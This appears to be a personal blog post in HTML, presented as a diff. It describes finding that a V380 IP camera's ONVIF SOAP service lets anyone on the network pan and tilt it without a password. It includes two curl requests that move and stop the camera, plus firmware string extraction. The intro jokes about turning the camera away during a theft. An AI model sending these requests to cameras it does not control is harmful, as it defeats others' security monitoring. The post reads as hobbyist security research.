@@ -1,0 +1,581 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>v380 IPcam: Move with SOAP</title>
+		<meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
+		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		<link rel="alternate" href="/feed/feed.json" type="application/json" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		
+		<style>/**
+ * okaidia theme for JavaScript, CSS and HTML
+ * Loosely based on Monokai textmate theme by http://www.monokai.nl/
+ * @author ocodia
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: #f8f8f2;
+	background: none;
+	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	font-size: 1em;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+	border-radius: 0.3em;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #272822;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: #8292a2;
+}
+
+.token.punctuation {
+	color: #f8f8f2;
+}
+
+.token.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #f92672;
+}
+
+.token.boolean,
+.token.number {
+	color: #ae81ff;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #a6e22e;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string,
+.token.variable {
+	color: #f8f8f2;
+}
+
+.token.atrule,
+.token.attr-value,
+.token.function,
+.token.class-name {
+	color: #e6db74;
+}
+
+.token.keyword {
+	color: #66d9ef;
+}
+
+.token.regex,
+.token.important {
+	color: #fd971f;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+/*
+ * New diff- syntax
+ */
+
+pre[class*="language-diff-"] {
+	--eleventy-code-padding: 1.25em;
+	padding-left: var(--eleventy-code-padding);
+	padding-right: var(--eleventy-code-padding);
+}
+.token.deleted {
+	background-color: hsl(0, 51%, 37%);
+	color: inherit;
+}
+.token.inserted {
+	background-color: hsl(126, 31%, 39%);
+	color: inherit;
+}
+
+/* Make the + and - characters unselectable for copy/paste */
+.token.prefix.unchanged,
+.token.prefix.inserted,
+.token.prefix.deleted {
+	-webkit-user-select: none;
+	user-select: none;
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	padding-top: 2px;
+	padding-bottom: 2px;
+}
+.token.prefix.inserted,
+.token.prefix.deleted {
+	width: var(--eleventy-code-padding);
+	background-color: rgba(0,0,0,.2);
+}
+
+/* Optional: full-width background color */
+.token.inserted:not(.prefix),
+.token.deleted:not(.prefix) {
+	display: block;
+	margin-left: calc(-1 * var(--eleventy-code-padding));
+	margin-right: calc(-1 * var(--eleventy-code-padding));
+	text-decoration: none; /* override del, ins, mark defaults */
+	color: inherit; /* override del, ins, mark defaults */
+}
+* { box-sizing: border-box; }
+/* Defaults */
+:root {
+	--font-family: -apple-system, system-ui, sans-serif;
+	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
+}
+
+/* Theme colors */
+:root {
+	--color-gray-20: #e0e0e0;
+	--color-gray-50: #C0C0C0;
+	--color-gray-90: #333;
+
+	--background-color: #fff;
+
+	--text-color: var(--color-gray-90);
+	--text-color-link: #082840;
+	--text-color-link-active: #5f2b48;
+	--text-color-link-visited: #17050F;
+
+	--syntax-tab-size: 2;
+
+	--pinyin-font: 'Arima Madurai';
+}
+
+@media (prefers-color-scheme: dark) {
+	:root {
+		--color-gray-20: #e0e0e0;
+		--color-gray-50: #C0C0C0;
+		--color-gray-90: #dad8d8;
+
+		/* --text-color is assigned to --color-gray-_ above */
+		--text-color-link: #1493fb;
+		--text-color-link-active: #6969f7;
+		--text-color-link-visited: #a6a6f8;
+
+		--background-color: #15202b;
+	}
+}
+
+
+/* Global stylesheet */
+* {
+	box-sizing: border-box;
+}
+
+html,
+body {
+	padding: 0;
+	margin: 0 auto;
+	font-family: var(--font-family);
+	color: var(--text-color);
+	background-color: var(--background-color);
+}
+html {
+	overflow-y: scroll;
+}
+body {
+	max-width: 55em;
+}
+
+/* https://www.a11yproject.com/posts/how-to-hide-content/ */
+.visually-hidden {
+	clip: rect(0 0 0 0);
+	clip-path: inset(50%);
+	height: 1px;
+	overflow: hidden;
+	position: absolute;
+	white-space: nowrap;
+	width: 1px;
+}
+
+p:last-child {
+	margin-bottom: 0;
+}
+p {
+	line-height: 1.5;
+}
+
+li {
+	line-height: 1.5;
+}
+
+a[href] {
+	color: var(--text-color-link);
+}
+a[href]:visited {
+	color: var(--text-color-link-visited);
+}
+a[href]:hover,
+a[href]:active {
+	color: var(--text-color-link-active);
+}
+
+main {
+	padding: 1rem;
+}
+main :first-child {
+	margin-top: 0;
+}
+
+header {
+	border-bottom: 1px dashed var(--color-gray-20);
+}
+header:after {
+	content: "";
+	display: table;
+	clear: both;
+}
+
+.links-nextprev {
+	list-style: none;
+	border-top: 1px dashed var(--color-gray-20);
+	padding: 1em 0;
+}
+
+table {
+	margin: 1em 0;
+}
+table td,
+table th {
+	padding-right: 1em;
+}
+
+pre,
+code {
+	font-family: var(--font-family-monospace);
+}
+pre:not([class*="language-"]) {
+	margin: .5em 0;
+	line-height: 1.375; /* 22px /16 */
+	-moz-tab-size: var(--syntax-tab-size);
+	-o-tab-size: var(--syntax-tab-size);
+	tab-size: var(--syntax-tab-size);
+	-webkit-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+}
+code {
+	word-break: break-all;
+}
+p > code {
+	color: #722;
+	text-decoration: underline #7222;
+}
+
+/* Header */
+header {
+	display: flex;
+	gap: 1em .5em;
+	flex-wrap: wrap;
+	align-items: center;
+	padding: 1em;
+}
+.home-link {
+	font-size: 1em; /* 16px /16 */
+	font-weight: 700;
+	margin-right: 2em;
+}
+.home-link:link:not(:hover) {
+	text-decoration: none;
+}
+
+/* Nav */
+.nav {
+	display: flex;
+	padding: 0;
+	margin: 0;
+	list-style: none;
+}
+.nav-item {
+	display: inline-block;
+	margin-right: 1em;
+}
+.nav-item a[href]:not(:hover) {
+	text-decoration: none;
+}
+.nav a[href][aria-current="page"] {
+	text-decoration: underline;
+}
+
+/* Posts list */
+.postlist {
+	list-style: none;
+	padding: 0;
+	padding-left: 1.5rem;
+}
+.postlist-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	counter-increment: start-from -1;
+	margin-bottom: 1em;
+}
+.postlist-item:before {
+	display: inline-block;
+	pointer-events: none;
+	content: "" counter(start-from, decimal-leading-zero) ". ";
+	line-height: 100%;
+	text-align: right;
+	margin-left: -1.5rem;
+}
+.postlist-date,
+.postlist-item:before {
+	font-size: 0.8125em; /* 13px /16 */
+	color: var(--color-gray-90);
+}
+.postlist-date {
+	word-spacing: -0.5px;
+}
+.postlist-link {
+	font-size: 1.1875em; /* 19px /16 */
+	font-weight: 700;
+	flex-basis: calc(100% - 1.5rem);
+	padding-left: .25em;
+	padding-right: .5em;
+	text-underline-position: from-font;
+	text-underline-offset: 0;
+	text-decoration-thickness: 1px;
+}
+.postlist-item-active .postlist-link {
+	font-weight: bold;
+}
+
+/* Tags */
+.post-tag {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	text-transform: capitalize;
+	font-style: italic;
+}
+.postlist-item > .post-tag {
+	align-self: center;
+}
+
+/* Tags list */
+.post-metadata {
+	display: inline-flex;
+	flex-wrap: wrap;
+	gap: .5em;
+	list-style: none;
+	padding: 0;
+	margin: 0;
+}
+.post-metadata time {
+	margin-right: 1em;
+}
+
+/* Direct Links / Markdown Headers */
+.header-anchor {
+	text-decoration: none;
+	font-style: normal;
+	font-size: 1em;
+	margin-left: .1em;
+}
+a[href].header-anchor,
+a[href].header-anchor:visited {
+	color: transparent;
+}
+a[href].header-anchor:focus,
+a[href].header-anchor:hover {
+	text-decoration: underline;
+}
+a[href].header-anchor:focus,
+:hover > a[href].header-anchor {
+	color: #aaa;
+}
+
+h2 + .header-anchor {
+	font-size: 1.5em;
+}
+
+.pyin {
+	font-family: var(--pinyin-font), cursive;
+}
+
+figure {
+	margin: -1.7em 0 0.7em 0;
+}
+
+figcaption {
+	font-style: italic;
+}
+
+figure img {
+	border: 1px solid #ccc;
+}</style>
+		<link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700" rel="stylesheet" referrerpolicy="no-referrer">
+	</head>
+	<body>
+		<a href="#skip" class="visually-hidden">Skip to main content</a>
+
+		<header>
+			<a href="/" class="home-link">ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ</a>
+			<nav>
+				<h2 class="visually-hidden">Top level navigation menu</h2>
+				<ul class="nav">
+					<li class="nav-item"><a href="/">Home</a></li>
+					<li class="nav-item"><a href="/blog/">Archive</a></li>
+					<li class="nav-item"><a href="/about/">About Me</a></li>
+				</ul>
+			</nav>
+		</header>
+
+		<main id="skip">
+			
+<h1>v380 IPcam: Move with SOAP</h1>
+
+<ul class="post-metadata">
+	<li><time datetime="2020-03-24">2020年03月</time></li>
+	<li><a href="/tags/security/" class="post-tag">security</a>, </li>
+	<li><a href="/tags/hardware/" class="post-tag">hardware</a>, </li>
+	<li><a href="/tags/v380-ipcam/" class="post-tag">v380 IPcam</a></li>
+</ul>
+
+<p>You can remotely pan/tilt the camera so it points away from the crown jewels while you move in to steal them.</p>
+<p>I finally got a chance to play with the IPcam after leaving it in a cupboard for (amazingly) 2 years.
+The <code>WiFi Smart Net Camera V380</code> has port 8899 open running <code>gSOAP/2.8</code>. It uses SOAP :face_vomiting: to implement the ONVIF standard for device management. Most IP camera software can talk ONVIF, so it's not so bad.</p>
+<p>I downloaded the wsdl (schema definition, I say <span class="ipa">/wɪzdl/</span>) for the PTZ  (Pan-tilt-zoom) function and loaded it into SoapUI. Most of the functions weren't implemented, but two nice ones were:</p>
+<ul>
+<li>ContinuousMove</li>
+<li>Stop</li>
+</ul>
+<p>So it looks like even though the camera requires a password to be accessed via the app, it can actually be panned/tilted by anyone on the network without a password.</p>
+<p>‌<figure><picture><source type="image/avif" srcset="/img/9o6AGWwbwr-1130.avif 1130w"><source type="image/webp" srcset="/img/9o6AGWwbwr-1130.webp 1130w"><img alt="PTZ requests and responses" loading="lazy" decoding="async" src="/img/9o6AGWwbwr-1130.png" width="1130" height="688"></picture><figcaption>PTZ requests and responses</figcaption></figure></p>
+<h2 id="examples" tabindex="-1">Examples <a class="header-anchor" href="#examples">#</a></h2>
+<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">curl</span> http://192.168.1.1:8899/ <span class="token punctuation">\</span>
+  <span class="token parameter variable">-H</span> <span class="token string">'Content-Type: application/soap+xml;charset=UTF-8;action="http://www.onvif.org/ver20/ptz/wsdl/ContinuousMove"'</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--data</span> <span class="token string">'&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsdl="http://www.onvif.org/ver20/ptz/wsdl" xmlns:sch="http://www.onvif.org/ver10/schema">
+   &lt;soap:Header/>
+   &lt;soap:Body>
+      &lt;wsdl:ContinuousMove>
+         &lt;wsdl:ProfileToken>blah&lt;/wsdl:ProfileToken>
+         &lt;wsdl:Velocity>
+            &lt;sch:PanTilt x="-0.1" y="0.1" space="0.3"/>
+            &lt;sch:Zoom x="0" space="0"/>
+         &lt;/wsdl:Velocity>
+      &lt;/wsdl:ContinuousMove>
+   &lt;/soap:Body>
+&lt;/soap:Envelope>'</span>
+<span class="token function">curl</span> http://192.168.1.1:8899/ <span class="token punctuation">\</span>
+  <span class="token parameter variable">-H</span> <span class="token string">'Content-Type: application/soap+xml;charset=UTF-8;action="http://www.onvif.org/ver20/ptz/wsdl/Stop"'</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--data</span> <span class="token string">'&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsdl="http://www.onvif.org/ver20/ptz/wsdl">
+   &lt;soap:Header/>
+   &lt;soap:Body>
+      &lt;wsdl:Stop>
+         &lt;wsdl:ProfileToken>whatevs&lt;/wsdl:ProfileToken>
+         &lt;wsdl:PanTilt>1&lt;/wsdl:PanTilt>
+         &lt;wsdl:Zoom>1&lt;/wsdl:Zoom>
+      &lt;/wsdl:Stop>
+   &lt;/soap:Body>
+&lt;/soap:Envelope>'</span></code></pre>
+<p>Note, this doesn't give us stream access or command execution.</p>
+<h2 id="implemented-actions" tabindex="-1">Implemented actions <a class="header-anchor" href="#implemented-actions">#</a></h2>
+<p>After downloading a firmware patch and extracting with <code>binwalk</code>, I searched for the SOAP server with <code>grep -R -a gSOAP</code> and found <code>libonvif.so</code>.</p>
+<p>Then I searched the binary for names of implemented commands using <code>rabin2 -zzz</code> which often gives nicer results than <code>strings</code>. It's part of Radare2, which I have yet to learn how to use properly. Anyway:</p>
+<pre class="language-terminal" tabindex="0"><code class="language-terminal">$ rabin2 -zzz -N 8 squashfs-root/lib/libonvif.so | \
+    grep 'string=[^_]*:.*Response$' | \
+    sed 's/[^:]*:\(.*\)Response/\1/' | \
+    sort -u
+ContinuousMove
+GetAudioEncoderConfiguration
+GetAudioEncoderConfigurations
+GetAudioSourceConfiguration
+GetAudioSourceConfigurations
+GetAudioSources
+GetCapabilities
+GetConfiguration
+GetConfigurationOptions
+GetConfigurations
+GetDeviceInformation
+GetOptions
+GetProfile
+GetProfiles
+GetServices
+GetStreamUri
+GetSystemDateAndTime
+GetVideoEncoderConfiguration
+GetVideoEncoderConfigurationOptions
+GetVideoEncoderConfigurations
+GetVideoSourceConfiguration
+GetVideoSourceConfigurations
+GetVideoSources
+SetVideoEncoderConfiguration
+Stop</code></pre>
+<p>So 25 actions in total, but I think the <code>ContinuousMove</code> is the only fun one.</p>
+
+<ul class="links-nextprev"><li>Previous: <a href="/sectalks-ctf-rop-aslr-500/">SecTalks CTF: ROP + ASLR = 500¥</a></li><li>Next: <a href="/v380-ipcam-firmware-patching/">v380 IPcam: Firmware patching</a></li>
+</ul>
+
+		</main>
+
+		<footer></footer>
+
+		<!-- Current page: /v380-ipcam-move-with-soap/ -->
+	</body>
+</html>
